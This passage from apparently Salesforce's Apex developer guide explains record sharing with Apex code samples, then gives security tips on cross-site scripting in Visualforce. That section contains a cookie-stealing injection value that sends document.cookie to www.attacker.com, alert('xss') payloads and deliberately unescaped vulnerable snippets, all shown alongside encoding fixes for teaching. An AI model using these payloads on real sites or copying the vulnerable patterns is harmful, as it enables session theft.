edit, transfer, share, and delete the record. **Role Hierarchy** The role hierarchy enables users above another user in the hierarchy to have the same level of access to records owned by or shared with users below. Consequently, users above a record owner in the role hierarchy are also implicitly granted Full Access to the record, though this behavior can be disabled for specific custom objects. The role hierarchy is not maintained with sharing records. Instead, role hierarchy access is derived at runtime. For more information, see “Controlling Access Using Hierarchies” in the Salesforce online help. **Sharing Rules** Sharing rules are used by administrators to automatically grant users within a given group or role access to records owned by a specific group of users. Sharing rules cannot be added to a package and cannot be used to support sharing logic for apps installed from AppExchange. Sharing rules can be based on record ownership or other criteria. You can’t use Apex to create criteria-based sharing rules. Also, criteria-based sharing cannot be tested using Apex. All implicit sharing added by Force.com managed sharing cannot be altered directly using the Salesforce user interface, SOAP API, or Apex. **User Managed Sharing, also known as Manual Sharing** User managed sharing allows the record owner or any user with Full Access to a record to share the record with a user or group of users. This is generally done by an end user, for a single record. Only the record owner and users above the owner in the role hierarchy are granted Full Access to the record. It is not possible to grant other users Full Access. Users with the “Modify All Records” object-level permission for the given object or the “Modify All Data” permission can also manually share a record. User managed sharing is removed when the record owner changes or when the access granted in the sharing does not grant additional access beyond the object's organization-wide sharing default access level. **Apex Managed Sharing** Apex managed sharing provides developers with the ability to support an application’s particular sharing requirements programmatically through Apex or the SOAP API. This type of sharing is similar to managed sharing. Only users with “Modify All Data” permission can add or change Apex managed sharing on a record. Apex managed sharing is maintained across record owner changes. Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects. The Sharing Reason Field In the Salesforce user interface, the `Reason` field on a custom object specifies the type of sharing used for a record. This field is called `rowCause` in Apex or the API. Each of the following list items is a type of sharing used for records. The tables show `Reason` field value, and the related `rowCause` value. Managed Sharing `rowCause` `Reason` `Field` `ImplicitChild` Account Sharing `ImplicitParent` Associated record owner or sharing `Owner` Owner `Team` Opportunity Team `Rule` Sharing Rule `TerritoryRule` Territory Assignment Rule User Managed Sharing `rowCause` `Reason` `Field` `Manual` Manual Sharing `TerritoryManual` Territory Manual With Enterprise Territory Management in API version 45.0 and later, `Territory2AssociationManual` replaces `TerritoryManual` . Apex Managed Sharing `rowCause` `Reason` `Field` Defined by developer Defined by developer The displayed reason for Apex managed sharing is defined by the developer. Access Levels When determining a user’s access to a record, the most permissive level of access is used. Most share objects support the following access levels: Only the record owner and users above the record owner in the role hierarchy can view and edit the record. This access level only applies to the AccountShare object. None Private The specified user or group can view the record only. Read Read Only The specified user or group can view and edit the record. Edit Read/Write The specified user or group can view, edit, transfer, share, and delete the record. All Full Access This access level can only be granted with managed sharing. Sharing Considerations **Apex Triggers and User Record Sharing** If a trigger changes the owner of a record, the running user must have read access to the new owner’s user record if the trigger is started through the following: API Standard user interface Standard Visualforce controller Class defined with the `with` `sharing` keyword If a trigger is started through a class that’s not defined with the `with` `sharing` keyword, the trigger runs in system mode. In this case, the trigger doesn’t require the running user to have specific access. Where possible, we changed noninclusive terms to align with our company value of Equality. We maintained certain terms to avoid any effect on customer implementations. To access sharing programmatically, you must use the share object associated with the standard or custom object for which you want to share. For example, AccountShare is the sharing object for the Account object, ContactShare is the sharing object for the Contact object. In addition, all custom object sharing objects are named as follows, where `MyCustomObject` is the name of the custom object:

```apex
MyCustomObject__Share
```

Objects on the detail side of a master-detail relationship don’t have an associated sharing object. The detail record’s access is determined by the master’s sharing object and the relationship’s sharing setting. For more information, see “Custom Object Security” in the Salesforce Help. A share object includes records supporting all three types of sharing: managed sharing, user managed sharing, and Apex managed sharing. Sharing that is granted to users implicitly through organization-wide defaults, the role hierarchy, and permissions such as the “View All Records” and “Modify All Records” permissions for the given object, “View All Data,” and “Modify All Data” aren’t tracked with this object. Every share object has the following properties: The level of access that the specified user or group has been granted for a share sObject. The name of the property is `AccessLevel` appended to the object name. For example, the property name for LeadShare object is `LeadAccessLevel` . Valid values are:

```apex
objectNameAccessLevel
```

`Edit` `Read` `All` The `All` access level is an internal value and can’t be granted. This field must be set to an access level that’s higher than the organization’s default access level for the parent object. For more information, see Understanding Sharing on page 223. The ID of the custom object. This field can’t be updated. `ParentID` The reason why the user or group is being granted access. The reason determines the type of sharing, which controls who can alter the sharing record. This field can’t be updated. `RowCause` The user or group IDs to which you’re granting access. A group can be: `UserOrGroupId` A public group or a sharing group associated with a role. A territory group. This field can’t be updated. You can't grant access to unauthenticated guest users using Apex. You can share a standard or custom object with users or groups. For more information about the types of users and groups you can share an object with, see User and Group in the Object Reference for Salesforce . Creating User Managed Sharing Using Apex It’s possible to manually share a record to a user or a group using Apex or SOAP API. If the owner of the record changes, the sharing is automatically deleted. The following example class contains a method that shares the job specified by the job ID with the specified user or group ID with read access. It also includes a test method that validates this method. Before you save this example class, create a custom object called Job. Manual shares written using Apex contains `RowCause="Manual"` by default. Only shares with this condition are removed when ownership changes.

```apex
public class JobSharing {
```

```apex
public static boolean manualShareRead(Id recordId, Id userOrGroupId){
```

```apex
// Create new sharing object for the custom object Job.
Job__Share jobShr
= new Job__Share();
```

```apex
// Set the ID of record being shared.
jobShr.ParentId = recordId;
```

```apex
// Set the ID of user or group being granted access.
jobShr.UserOrGroupId = userOrGroupId;
```

```apex
// Set the access level.
jobShr.AccessLevel = 'Read';
```

```apex
// Set rowCause to 'manual' for manual sharing.
// This line can be omitted as 'manual' is the default value for sharing objects.
jobShr.RowCause = Schema.Job__Share.RowCause.Manual;
```

```apex
// Insert the sharing record and capture the save result.
// The false parameter allows for partial processing if multiple records passed
// into the operation.
Database.SaveResult sr = Database.insert(jobShr,false);
```

```apex
// Process the save results.
if(sr.isSuccess()){
```

```apex
// Indicates success
return true;
}
else {
```

```apex
// Get first save result error.
Database.Error err = sr.getErrors()[0];
```

```apex
// Check if the error is related to trival access level.
// Access level must be more permissive than the object's default.
// These sharing records are not required and thus an insert exception is
acceptable.
```

```apex
if(err.getStatusCode() == StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION
&&
err.getMessage().contains('AccessLevel')){
// Indicates success.
return true;
```

```apex
}
else{
```

```apex
// Indicates failure.
return false;
}
}
}
```

```apex
}
```

```apex
@isTest
private class JobSharingTest {
```

```apex
// Test for the manualShareRead method
static testMethod void testManualShareRead(){
```

```apex
// Select users for the test.
List<User> users = [SELECT Id FROM User WHERE IsActive = true LIMIT 2];
Id User1Id = users[0].Id;
Id User2Id = users[1].Id;
```

```apex
// Create new job.
Job__c j = new Job__c();
j.Name = 'Test Job';
j.OwnerId = user1Id;
insert j;
```

```apex
// Insert manual share for user who is not record owner.
System.assertEquals(JobSharing.manualShareRead(j.Id, user2Id), true);
```

```apex
// Query job sharing records.
List<Job__Share> jShrs = [SELECT Id, UserOrGroupId, AccessLevel,
RowCause FROM job__share WHERE ParentId = :j.Id AND UserOrGroupId= :user2Id];
```

```apex
// Test for only one manual share on job.
System.assertEquals(jShrs.size(), 1, 'Set the object\'s sharing model to Private.');
```

```apex
// Test attributes of manual share.
System.assertEquals(jShrs[0].AccessLevel, 'Read');
System.assertEquals(jShrs[0].RowCause, 'Manual');
System.assertEquals(jShrs[0].UserOrGroupId, user2Id);
```

```apex
// Test invalid job Id.
delete j;
```

```apex
// Insert manual share for deleted job id.
System.assertEquals(JobSharing.manualShareRead(j.Id, user2Id), false);
}
}
```

The object’s organization-wide default access level must not be set to the most permissive access level. For custom objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 223. Creating Apex Managed Sharing Apex managed sharing enables developers to programmatically manipulate sharing to support their application’s behavior through either Apex or SOAP API. This type of sharing is similar to managed sharing. Only users with “Modify All Data” permission can add or change Apex managed sharing on a record. Apex managed sharing is maintained across record owner changes. Apex managed sharing must use an Apex sharing reason . Apex sharing reasons are a way for developers to track why they shared a record with a user or group of users. Using multiple Apex sharing reasons simplifies the coding required to make updates and deletions of sharing records. They also enable developers to share with the same user or group multiple times using different reasons. Apex sharing reasons aren’t available in Lightning Experience. Use Salesforce Classic to create sharing reasons within the UI. See Point and Click Customization for the complete list of differences in features and settings between Salesforce Classic and Lightning Experience. Apex sharing reasons are defined on an object's detail page. Each Apex sharing reason has a label and a name: The label displays in the `Reason` column when viewing the sharing for a record in the user interface. This label allows users and administrators to understand the source of the sharing. The label is also enabled for translation through the Translation Workbench. The name is used when referencing the reason in the API and Apex. All Apex sharing reason names have the following format:

```apex
MyReasonName__c
```

Apex sharing reasons can be referenced programmatically as follows:

```apex
Schema.CustomObject__Share.rowCause.SharingReason__c
```

For example, an Apex sharing reason called Recruiter for an object called Job can be referenced as follows:

```apex
Schema.Job__Share.rowCause.Recruiter__c
```

For more information, see System.Schema Class . To create an Apex sharing reason: **1.** From the management settings for the custom object, click **New** in the Apex Sharing Reasons related list. **2.** Enter a label for the Apex sharing reason. The label displays in the `Reason` column when viewing the sharing for a record in the user interface. The label is also enabled for translation through the Translation Workbench. **3.** Enter a name for the Apex sharing reason. The name is used when referencing the reason in the API and Apex. This name can contain only underscores and alphanumeric characters, and must be unique in your org. It must begin with a letter, not include spaces, not end with an underscore, and not contain two consecutive underscores. **4.** Click **Save** . Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects. Apex Managed Sharing Example For this example, suppose that you’re building a recruiting application and have an object called Job. You want to validate that the recruiter and hiring manager listed on the job have access to the record. The following trigger grants the recruiter and hiring manager access when the job record is created. This example requires a custom object called Job, with two lookup fields associated with User records called Hiring_Manager and Recruiter. Also, the Job custom object must have two sharing reasons added called Hiring_Manager and Recruiter.

```apex
trigger JobApexSharing on Job__c (after insert) {
```

```apex
if(trigger.isInsert){
```

```apex
// Create a new list of sharing objects for Job
List<Job__Share> jobShrs
= new List<Job__Share>();
```

```apex
// Declare variables for recruiting and hiring manager sharing
Job__Share recruiterShr;
Job__Share hmShr;
```

```apex
for(Job__c job : trigger.new){
```

```apex
// Instantiate the sharing objects
recruiterShr = new Job__Share();
hmShr = new Job__Share();
```

```apex
// Set the ID of record being shared
recruiterShr.ParentId = job.Id;
hmShr.ParentId = job.Id;
```

```apex
// Set the ID of user or group being granted access
recruiterShr.UserOrGroupId = job.Recruiter__c;
hmShr.UserOrGroupId = job.Hiring_Manager__c;
```

```apex
// Set the access level
recruiterShr.AccessLevel = 'edit';
hmShr.AccessLevel = 'read';
```

```apex
// Set the Apex sharing reason for hiring manager and recruiter
recruiterShr.RowCause = Schema.Job__Share.RowCause.Recruiter__c;
hmShr.RowCause = Schema.Job__Share.RowCause.Hiring_Manager__c;
```

```apex
// Add objects to list for insert
jobShrs.add(recruiterShr);
jobShrs.add(hmShr);
}
```

```apex
// Insert sharing records and capture save result
// The false parameter allows for partial processing if multiple records are passed
```

```apex
// into the operation
Database.SaveResult[] lsr = Database.insert(jobShrs,false);
```

```apex
// Create counter
Integer i=0;
```

```apex
// Process the save results
for(Database.SaveResult sr : lsr){
```

```apex
if(!sr.isSuccess()){
```

```apex
// Get the first save result error
Database.Error err = sr.getErrors()[0];
```

```apex
// Check if the error is related to a trivial access level
// Access levels equal or more permissive than the object's default
// access level are not allowed.
// These sharing records are not required and thus an insert exception is
```

```apex
// acceptable.
if(!(err.getStatusCode() == StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION
```

```apex
&&
err.getMessage().contains('AccessLevel'))){
```

```apex
// Throw an error when the error is not related to trivial access
level.
```

```apex
trigger.newMap.get(jobShrs[i].ParentId).
addError(
```

```apex
'Unable to grant sharing access due to following exception: '
+ err.getMessage());
}
}
i++;
}
}
```

```apex
}
```

Under certain circumstances, inserting a share row results in an update of an existing share row. Consider these examples: A manual share access level is set to Read and you insert a new one set to Write. The original share rows are updated to Write, indicating the higher level of access. Users can access an account because they can access its child records (contact, case, opportunity, and so on). If an account sharing rule is created, the sharing rule row cause (which is a higher access level) replaces the parent implicit share row cause, indicating the higher level of access. The object’s organization-wide default access level must not be set to the most permissive access level. For custom objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 223. Creating Apex Managed Sharing for Customer Community Plus users Customer Community Plus users are previously known as Customer Portal users. Share objects, such as `AccountShare` and `ContactShare` , aren’t available to these users. If you must use share objects as a Customer Community Plus user, consider using a trigger, which operates with the `without` `sharing` keyword by default. Otherwise, use an inner class with the same keyword to enable the DML operation to run successfully. A separate utility class can also be used to enable this access. Granting visibility via manual or apex shares written to the share objects is supported but the objects themselves aren't available to Customer Community Plus users. However, other users can add shares that grant access to Customer Community Plus users. After enabling digital experiences, records accessible to Roles and Subordinates via Apex managed sharing are automatically made accessible to Roles, Internal, and Portal Subordinates. To secure external users’ access, update your Apex code so that it creates shares to the Role and Internal Subordinates group. Because this conversion is a large-scale operation, consider using batch Apex . Salesforce automatically recalculates sharing for all records on an object when its organization-wide sharing default access level changes. The recalculation adds managed sharing when appropriate. In addition, all types of sharing are removed if the access they grant is considered redundant. For example, manual sharing, which grants Read Only access to a user, is deleted when the object’s sharing model changes from Private to Public Read Only. To recalculate Apex managed sharing, you must write an Apex class that implements a Salesforce-provided interface to do the recalculation. You must then associate the class with the custom object, on the custom object's detail page, in the Apex Sharing Recalculation related list. Apex sharing reasons and Apex managed sharing recalculation are only available for custom objects. You can execute this class from the custom object detail page where the Apex sharing reason is specified. An administrator might need to recalculate the Apex managed sharing for an object if a locking issue prevented Apex code from granting access to a user as defined by the application’s logic. You can also use the Database.executeBatch method to programmatically invoke an Apex managed sharing recalculation. Every time a custom object's organization-wide sharing default access level is updated, any Apex recalculation classes defined for associated custom object are also executed. To monitor or stop the execution of the Apex recalculation, from Setup, enter `Apex` `Jobs` in the `Quick` `Find` box, then select **Apex Jobs** . Creating an Apex Class for Recalculating Sharing To recalculate Apex managed sharing, you must write an Apex class to do the recalculation. This class must implement the Salesforce-provided interface `Database.Batchable` . The `Database.Batchable` interface is used for all batch Apex processes, including recalculating Apex managed sharing. You can implement this interface more than once in your organization. For more information on the methods that must be implemented, see Use Batch Apex on page 306. Before creating an Apex managed sharing recalculation class, also consider the best practices . The object’s organization-wide default access level must not be set to the most permissive access level. For custom objects, this level is Public Read/Write. For more information, see Understanding Sharing on page 223. Apex Managed Sharing Recalculation Example For this example, suppose that you are building a recruiting application and have an object called Job. You want to validate that the recruiter and hiring manager listed on the job have access to the record. The following Apex class performs this validation. This example requires a custom object called Job, with two lookup fields associated with User records called Hiring_Manager and Recruiter. Also, the Job custom object should have two sharing reasons added called Hiring_Manager and Recruiter. Before you run this sample, replace the email address with a valid email address to which you want to send error notifications and job completion notifications.

```apex
global class JobSharingRecalc implements Database.Batchable<sObject> {
```

```apex
// String to hold email address that emails will be sent to.
// Replace its value with a valid email address.
static String emailAddress = 'admin@yourcompany.com';
```

```apex
// The start method is called at the beginning of a sharing recalculation.
// This method returns a SOQL query locator containing the records
// to be recalculated.
global Database.QueryLocator start(Database.BatchableContext BC){
```

```apex
return Database.getQueryLocator([SELECT Id, Hiring_Manager__c, Recruiter__c
FROM Job__c]);
}
```

```apex
// The executeBatch method is called for each chunk of records returned from start.
```

```apex
global void execute(Database.BatchableContext BC, List<sObject> scope){
```

```apex
// Create a map for the chunk of records passed into method.
```

```apex
Map<ID, Job__c> jobMap = new Map<ID, Job__c>((List<Job__c>)scope);
```

```apex
// Create a list of Job__Share objects to be inserted.
List<Job__Share> newJobShrs = new List<Job__Share>();
```

```apex
// Locate all existing sharing records for the Job records in the batch.
// Only records using an Apex sharing reason for this app should be returned.
List<Job__Share> oldJobShrs = [SELECT Id FROM Job__Share WHERE ParentId IN
:jobMap.keySet() AND
(RowCause = :Schema.Job__Share.rowCause.Recruiter__c OR
RowCause = :Schema.Job__Share.rowCause.Hiring_Manager__c)];
```

```apex
// Construct new sharing records for the hiring manager and recruiter
// on each Job record.
for(Job__c job : jobMap.values()){
Job__Share jobHMShr = new Job__Share();
Job__Share jobRecShr = new Job__Share();
```

```apex
// Set the ID of user (hiring manager) on the Job record being granted access.
```

```apex
jobHMShr.UserOrGroupId = job.Hiring_Manager__c;
```

```apex
// The hiring manager on the job should always have 'Read Only' access.
jobHMShr.AccessLevel = 'Read';
```

```apex
// The ID of the record being shared
jobHMShr.ParentId = job.Id;
```

```apex
// Set the rowCause to the Apex sharing reason for hiring manager.
// This establishes the sharing record as Apex managed sharing.
jobHMShr.RowCause = Schema.Job__Share.RowCause.Hiring_Manager__c;
```

```apex
// Add sharing record to list for insertion.
newJobShrs.add(jobHMShr);
```

```apex
// Set the ID of user (recruiter) on the Job record being granted access.
jobRecShr.UserOrGroupId = job.Recruiter__c;
```

```apex
// The recruiter on the job should always have 'Read/Write' access.
jobRecShr.AccessLevel = 'Edit';
```

```apex
// The ID of the record being shared
jobRecShr.ParentId = job.Id;
```

```apex
// Set the rowCause to the Apex sharing reason for recruiter.
// This establishes the sharing record as Apex managed sharing.
jobRecShr.RowCause = Schema.Job__Share.RowCause.Recruiter__c;
```

```apex
// Add the sharing record to the list for insertion.
```

```apex
newJobShrs.add(jobRecShr);
}
```

```apex
try {
```

```apex
// Delete the existing sharing records.
// This allows new sharing records to be written from scratch.
```

```apex
Delete oldJobShrs;
```

```apex
// Insert the new sharing records and capture the save result.
// The false parameter allows for partial processing if multiple records are
// passed into operation.
Database.SaveResult[] lsr = Database.insert(newJobShrs,false);
```

```apex
// Process the save results for insert.
for(Database.SaveResult sr : lsr){
```

```apex
if(!sr.isSuccess()){
```

```apex
// Get the first save result error.
Database.Error err = sr.getErrors()[0];
```

```apex
// Check if the error is related to trivial access level.
// Access levels equal or more permissive than the object's default
// access level are not allowed.
// These sharing records are not required and thus an insert exception
```

```apex
// is acceptable.
if(!(err.getStatusCode() == StatusCode.FIELD_FILTER_VALIDATION_EXCEPTION
```

```apex
&&
err.getMessage().contains('AccessLevel'))){
// Error is not related to trivial access level.
// Send an email to the Apex job's submitter.
Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();
```

```apex
String[] toAddresses = new String[] {emailAddress};
mail.setToAddresses(toAddresses);
mail.setSubject('Apex Sharing Recalculation Exception');
mail.setPlainTextBody(
```

```apex
'The Apex sharing recalculation threw the following exception: ' +
```

```apex
err.getMessage());
Messaging.sendEmail(new Messaging.SingleEmailMessage[] { mail });
}
}
}
} catch(DmlException e) {
```

```apex
// Send an email to the Apex job's submitter on failure.
```

```apex
Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();
String[] toAddresses = new String[] {emailAddress};
mail.setToAddresses(toAddresses);
mail.setSubject('Apex Sharing Recalculation Exception');
mail.setPlainTextBody(
```

```apex
'The Apex sharing recalculation threw the following exception: ' +
e.getMessage());
Messaging.sendEmail(new Messaging.SingleEmailMessage[] { mail });
}
}
```

```apex
// The finish method is called at the end of a sharing recalculation.
```

```apex
global void finish(Database.BatchableContext BC){
```

```apex
// Send an email to the Apex job's submitter notifying of job completion.
Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();
String[] toAddresses = new String[] {emailAddress};
mail.setToAddresses(toAddresses);
mail.setSubject('Apex Sharing Recalculation Completed.');
mail.setPlainTextBody
('The Apex sharing recalculation finished processing');
Messaging.sendEmail(new Messaging.SingleEmailMessage[] { mail });
}
```

```apex
}
```

Testing Apex Managed Sharing Recalculations This example inserts five Job records and invokes the batch job that is implemented in the batch class of the previous example. This example requires a custom object called Job, with two lookup fields associated with User records called Hiring_Manager and Recruiter. Also, the Job custom object should have two sharing reasons added called Hiring_Manager and Recruiter. Before you run this test, set the organization-wide default sharing for Job to Private. Note that since email messages aren’t sent from tests, and because the batch class is invoked by a test method, the email notifications won’t be sent in this case.

```apex
@isTest
private class JobSharingTester {
```

```apex
// Test for the JobSharingRecalc class
static testMethod void testApexSharing(){
```

```apex
// Instantiate the class implementing the Database.Batchable interface.
```

```apex
JobSharingRecalc recalc = new JobSharingRecalc();
```

```apex
// Select users for the test.
List<User> users = [SELECT Id FROM User WHERE IsActive = true LIMIT 2];
ID User1Id = users[0].Id;
ID User2Id = users[1].Id;
```

```apex
// Insert some test job records.
List<Job__c> testJobs = new List<Job__c>();
for (Integer i=0;i<5;i++) {
Job__c j = new Job__c();
j.Name = 'Test Job ' + i;
j.Recruiter__c = User1Id;
j.Hiring_Manager__c = User2Id;
testJobs.add(j);
}
insert testJobs;
```

```apex
Test.startTest();
```

```apex
// Invoke the Batch class.
String jobId = Database.executeBatch(recalc);
```

```apex
Test.stopTest();
```

```apex
// Get the Apex job and verify there are no errors.
AsyncApexJob aaj = [Select JobType, TotalJobItems, JobItemsProcessed, Status,
```

```apex
CompletedDate, CreatedDate, NumberOfErrors
from AsyncApexJob where Id = :jobId];
System.assertEquals(0, aaj.NumberOfErrors);
```

```apex
// This query returns jobs and related sharing records that were inserted
// by the batch job's execute method.
List<Job__c> jobs = [SELECT Id, Hiring_Manager__c, Recruiter__c,
(SELECT Id, ParentId, UserOrGroupId, AccessLevel, RowCause FROM Shares
WHERE (RowCause = :Schema.Job__Share.rowCause.Recruiter__c OR
RowCause = :Schema.Job__Share.rowCause.Hiring_Manager__c))
FROM Job__c];
```

```apex
// Validate that Apex managed sharing exists on jobs.
for(Job__c job : jobs){
```

```apex
// Two Apex managed sharing records should exist for each job
// when using the Private org-wide default.
System.assert(job.Shares.size() == 2);
```

```apex
for(Job__Share jobShr : job.Shares){
```

```apex
// Test the sharing record for hiring manager on job.
```

```apex
if(jobShr.RowCause == Schema.Job__Share.RowCause.Hiring_Manager__c){
System.assertEquals(jobShr.UserOrGroupId,job.Hiring_Manager__c);
System.assertEquals(jobShr.AccessLevel,'Read');
}
// Test the sharing record for recruiter on job.
else if(jobShr.RowCause == Schema.Job__Share.RowCause.Recruiter__c){
System.assertEquals(jobShr.UserOrGroupId,job.Recruiter__c);
System.assertEquals(jobShr.AccessLevel,'Edit');
}
}
}
}
}
```

Associating an Apex Class Used for Recalculation An Apex class used for recalculation must be associated with a custom object. To associate an Apex managed sharing recalculation class with a custom object: **1.** From the management settings for the custom object, go to Apex Sharing Recalculations. **2.** Choose the Apex class that recalculates the Apex sharing for this object. The class you choose must implement the `Database.Batchable` interface. You cannot associate the same Apex class multiple times with the same custom object. **3.** Click **Save** .

#### Security Tips for Apex and Visualforce Development

The powerful combination of Apex and Visualforce pages allows Lightning Platform developers to provide custom functionality and business logic to Salesforce or to create a new standalone product running inside the Lightning Platform. But as with any programming language, developers must be cognizant of potential security-related pitfalls. Salesforce has incorporated several security defenses in the Lightning Platform. But careless developers can still bypass the built-in defenses and then expose their applications and customers to security risks. Many of the coding mistakes a developer can make on the Lightning Platform are similar to general web application security vulnerabilities, while others are unique to Apex. To certify an application for AppExchange, it’s important for developers to learn and understand the security flaws described. For more information, see the Lightning Platform Security Resources page on Salesforce Developers. https://developer.salesforce.com/page/Security . URL redirects automatically send a user to a different web page. Redirects are often used to guide navigation to a website, or refer multiple domain names belonging to the same owner to refer to a single website. Unfortunately for developers, attackers can exploit URL redirects when not implemented properly. Open redirect (also known as “arbitrary redirect”) is a common web application vulnerability where values controlled by the user determine where the app redirects. Open redirects through static resources can expose users to the risk of unintended, and possibly malicious, redirects. Only admins with “Customize Application” permissions can upload static resources within an organization. Admins with this permission must use caution to ensure that static resources don’t contain malicious content. To learn how to help guard against static resources that were obtained from third parties, see Referencing Untrusted Third-Party Content with iframes . Cross Site Scripting (XSS) Unescaped Output and Formulas in Visualforce Pages When using components that have set the `escape` attribute to false, or when including formulas outside of a Visualforce component, output is unfiltered and must be validated for security. This is especially important when using formula expressions. Cross-Site Request Forgery (CSRF) SOQL Injection Data Access Control The Salesforce Platform makes extensive use of data sharing rules. Each object has permissions and can have sharing settings that users can read, create, edit, and delete. These settings are enforced when using all standard controllers. Cross-site scripting (XSS) attacks are where malicious HTML or client-side scripting is provided to a web application. The web application includes malicious scripting in a response to a user who unknowingly becomes the victim of the attack. The attacker uses the web application as an intermediary in the attack, taking advantage of the victim's trust for the web application. Most applications that display dynamic web pages without properly validating the data are likely to be vulnerable. Attacks against the website are especially easy if input from one user is shown to another user. Some obvious possibilities include bulletin board or user comment-style websites, news, or email archives. For example, assume this script is included in a Lightning Platform page using a script component, an `on*` event, or a Visualforce page.

```apex
<script>var foo = '{!$CurrentPage.parameters.userparam}';</script>
```

This script block inserts the value of the user-supplied `userparam` onto the page. The attacker can then enter this value for `userparam` .

```apex
1';document.location='http://www.attacker.com/cgi-bin/cookie.cgi?'%2Bdocument.cookie;var%20foo='2
```

In this case, all cookies for the current page are sent to `www.attacker.com` as the query string in the request to the `cookie.cgi` script. At this point, the attacker has the victim's session cookie and can connect to the web application as if they were the victim. The attacker can post a malicious script using a website or email. Web application users not only see the attacker's input, but their browser can execute the attacker's script in a trusted context. With this ability, the attacker can perform a wide variety of attacks against the victim. These attacks range from simple actions, such as opening and closing windows, to more malicious attacks, such as stealing data or session cookies, which allow an attacker full access to the victim's session. For more information on this type of attack: http://www.owasp.org/index.php/Cross_Site_Scripting http://www.cgisecurity.com/xss-faq.html http://www.owasp.org/index.php/Testing_for_Cross_site_scripting http://www.google.com/search?q=cross-site+scripting Within the Lightning Platform, several anti-XSS defenses are in place. For example, Salesforce has filters that screen out harmful characters in most output methods. For the developer using standard classes and output methods, the threats of XSS flaws are largely mitigated. But the creative developer can still find ways to intentionally or accidentally bypass the default controls. Existing Protection All standard Visualforce components, which start with `<apex` `>` , have anti-XSS filters in place to screen out harmful characters. For example, this code is normally vulnerable to an XSS attack because it takes user-supplied input and outputs it directly back to the user, but the `<apex:outputText` `>` tag is XSS-safe. All characters that appear to be HTML tags are converted to their literal form. For example, the < character is converted to `&lt;` so that a literal < appears on the user's screen.

```apex
<apex:outputText>
{!$CurrentPage.parameters.userInput}
</apex:outputText>
```

Disabling Escape on Visualforce Tags By default, nearly all Visualforce tags escape the XSS-vulnerable characters. You can disable this behavior by setting the optional attribute `escape=` `"false"` . For example, this output is vulnerable to XSS attacks.

```apex
<apex:outputText escape="false" value="{!$CurrentPage.parameters.userInput}" />
```

Programming Items Not Protected from XSS Custom Javascript code and code within `<apex:includeScript>` components don’t have built-in XSS protections. These items allow the developer to customize the page with script commands. It doesn’t makes sense to include anti-XSS filters on commands that are intentionally added to a page. If you write your own JavaScript, the Lightning Platform has no way to protect you. For example, this code is vulnerable to XSS if used in JavaScript.

```apex
<script>
```

```apex
var foo = location.search;
document.write(foo);
</script>
```

With the `<apex:includeScript` `>` Visualforce component, you can include a custom script on a page. Make sure to validate that the content is safe and includes no user-supplied data. For example, this snippet is vulnerable because it includes user-supplied input as the value of the script text. The value provided by the tag is a URL to the JavaScript to include. If an attacker can supply arbitrary data to this parameter as in the example, they’re able to direct the victim to include any JavaScript file from any other website.

```apex
<apex:includeScript value="{!$CurrentPage.parameters.userInput}" />
```

When using components that have set the `escape` attribute to false, or when including formulas outside of a Visualforce component, output is unfiltered and must be validated for security. This is especially important when using formula expressions. Formula expressions can be function calls or include information about platform objects, a user's environment, system environment, and the request environment. It’s important to be aware that the output that’s generated by expressions isn’t escaped during rendering. Since expressions are rendered on the server, it’s not possible to escape rendered data on the client using JavaScript or other client-side technology. This can lead to potentially dangerous situations if the formula expression references non-system data (that is, potentially hostile or editable data) and the expression itself is not wrapped in a function to escape the output during rendering. A common vulnerability is created by rerendering user input on a page. For example,

```apex
<apex:page standardController="Account">
```

```apex
<apex:form>
```

```apex
<apex:commandButton rerender="outputIt" value="Update It"/>
<apex:inputText value="{!myTextField}"/>
</apex:form>
```

```apex
<apex:outputPanel id="outputIt">
Value of myTextField is <apex:outputText value="{!myTextField}" escape="false"/>
</apex:outputPanel>
</apex:page>
```

The unescaped `{!myTextField}` results in a cross-site scripting vulnerability. For example, if the user enters :

```apex
<script>alert('xss')
```

and clicks **Update It** , the JavaScript is executed. In this case, an alert dialog is displayed, but more malicious uses could be designed. There are several functions that you can use for escaping potentially insecure strings. **HTMLENCODE** Encodes text and merge field values for use in HTML by replacing characters that are reserved in HTML, such as the greater-than sign (>), with HTML entity equivalents, such as `&gt;` . **JSENCODE** Encodes text and merge field values for use in JavaScript by inserting escape characters, such as a backslash (\), before unsafe JavaScript characters, such as the apostrophe ('). **JSINHTMLENCODE** Encodes text and merge field values for use in JavaScript inside HTML tags by replacing characters that are reserved in HTML with HTML entity equivalents and inserting escape characters before unsafe JavaScript characters. `JSINHTMLENCODE(` `someValue` `)` is a convenience function that is equivalent to `JSENCODE(HTMLENCODE((` `someValue` `))` . That is, `JSINHTMLENCODE` first encodes `someValue` with `HTMLENCODE` , and then encodes the result with `JSENCODE` . **URLENCODE** Encodes text and merge field values for use in URLs by replacing characters that are illegal in URLs, such as blank spaces, with the code that represent those characters as defined in RFC 3986, Uniform Resource Identifier (URI): Generic Syntax . For example, blank spaces are replaced with `%20` , and exclamation points are replaced with `%21` . To use `HTMLENCODE` to secure the previous example, change the `<apex:outputText` `>` to the following:

```apex
<apex:outputText value=" {!HTMLENCODE(myTextField)}" escape="false"/>
```

If a user enters `<script` `>alert(` `'xss'` `)` and clicks **Update It** , the JavaScript is not be executed. Instead, the string is encoded and the page displays `Value` `of` `myTextField` `is` `<script` `>alert(` `'xss'` `)` . Depending on the placement of the tag and usage of the data, both the characters needing escaping as well as their escaped counterparts may vary. For instance, this statement, which copies a Visualforce request parameter into a JavaScript variable:

```apex
<script>var ret = "{!$CurrentPage.parameters.retURL}";</script>
```

requires that any double quote characters in the request parameter be escaped with the URL encoded equivalent of `%22` instead of the HTML escaped `"` . Otherwise, the request:

```apex
https://example.com/demo/redirect.html?retURL=%22foo%22%3Balert('xss')%3B%2F%2F
```

results in:

```apex
<script>var ret = "foo";alert('xss');//";</script>
```

When the page loads the JavaScript executes, and the alert is displayed. In this case, to prevent JavaScript from being executed, use the `JSENCODE` function. For example

```apex
<script>var ret = "{!JSENCODE($CurrentPage.parameters.retURL)}";</script>
```

